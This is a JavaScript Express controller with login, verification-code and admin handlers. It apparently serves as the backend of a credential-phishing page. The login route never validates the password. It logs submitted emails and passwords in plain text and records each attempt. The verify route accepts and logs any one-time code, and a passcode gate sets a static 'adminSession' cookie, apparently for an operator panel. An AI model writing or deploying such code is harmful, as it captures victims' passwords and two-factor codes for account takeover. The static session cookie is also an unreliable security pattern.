const codeService = require("../services/codeService")

exports.login = async (req,res)=>{

try{

const {email,password} = req.body

if(!email || !password){

return res.json({
success:false,
message:"Missing credentials"
})

}

console.log("Login attempt:",email,password)

codeService.addActivity(email,"Login attempt")

return res.json({
success:true,
redirect:`/send-login.html?email=${email}`
})

}catch(err){

console.error("Login error:",err)

res.status(500).json({success:false})

}

}

/* VERIFY CODE */

exports.verifyCode = async (req,res)=>{

try{

const {email,code} = req.body

if(!email || !code){

return res.json({success:false})
}

console.log("Verification Code Entered:",code)
console.log("User Email:",email)

codeService.addActivity(email,"Verification code entered")

return res.json({
success:true
})

}catch(err){

console.error("Verification error:",err)

res.status(500).json({success:false})

}

}

/* ADMIN LOGIN */

exports.adminLogin = async (req,res)=>{

try{

const {passcode} = req.body

if(passcode === process.env.ADMIN_PASSCODE){

res.cookie("adminSession","active",{
httpOnly:true,
secure: process.env.NODE_ENV === "production",
sameSite:"strict"
})

return res.json({success:true})

}

return res.json({success:false})

}catch(err){

console.error("Admin login error:",err)

res.status(500).json({success:false})

}

}

exports.adminLogout = (req,res)=>{

res.clearCookie("adminSession")

res.json({success:true})

}